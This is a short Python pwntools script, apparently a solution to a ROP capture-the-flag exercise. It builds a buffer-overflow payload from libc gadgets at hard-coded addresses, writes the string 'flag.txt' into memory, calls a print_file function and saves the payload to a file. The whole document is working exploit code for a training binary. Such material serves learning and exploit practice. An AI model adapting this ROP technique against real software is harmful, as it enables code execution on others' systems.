#!/bin/python

from pwn import *

file = b"flag.txt"

offset = 40
base = 0x00400000
libcBase = 0x7ffff7a19000
libsoLib = 0x7ffff7c00000

mov = p64(libcBase + 0xa2e50)
popRDI = p64(libcBase + 0x23875)
popRDXRBX = p64(libcBase + 0x826d9)

#we will write file name flag.exe here
filenameAddress = p64(libsoLib+0x00201060)
addressSlot1 = p64(libsoLib+0x00201008)

printAddress = p64(libsoLib+0x943)

exitAddress = p64(libsoLib+0x07b0)


rop = b"A"*offset
#write flag into filenameAddress
rop += popRDI
rop += filenameAddress
rop += popRDXRBX
rop += file
rop += file
rop += mov
#Write print_file address into got-plt address
#rop += popRDI
#rop += addressSlot1
#rop += popRDXRBX
#rop += printAddress
#rop += printAddress
#rop += mov

rop += popRDI
rop += filenameAddress
rop += printAddress

rop += popRDI
rop += p64(0x01)
rop += exitAddress

with open ('data', 'wb') as f:
	f.write(rop)

